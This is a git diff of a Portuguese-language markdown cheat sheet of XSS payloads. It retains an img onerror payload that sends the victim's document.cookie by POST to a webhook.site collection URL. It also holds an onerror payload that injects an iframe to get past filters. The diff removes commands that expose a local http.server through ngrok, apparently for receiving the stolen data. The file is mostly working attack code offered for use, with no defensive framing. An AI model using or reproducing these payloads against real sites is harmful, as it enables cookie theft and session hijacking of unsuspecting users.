@@ -28,20 +28,13 @@
 
 ---
   
-* **Payload XSS Simples para Roubo de Cookies:**
-    ```html
+### Payload XSS Simples para Roubo de Cookies:
+    ```
     <img src=x onerror="fetch('https://webhook.site/8a54464b-651a-4ae5-9d09-d19711774bd1',{method:'POST',body:'cookie='+document.cookie})">
     ```
-* **Bypass de filtro de iframe com xss onerror**
+### Bypass de filtro de iframe com xss onerror
 ```
 <img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
-```
-
-```bash
-python3 -m http.server 1234
-ngrok http 1234
-
-(pra se usar o ngrok precisa do http.server, porém só o http.server já server como server interno, o ngrok o deixa publico)
 ```
 
 
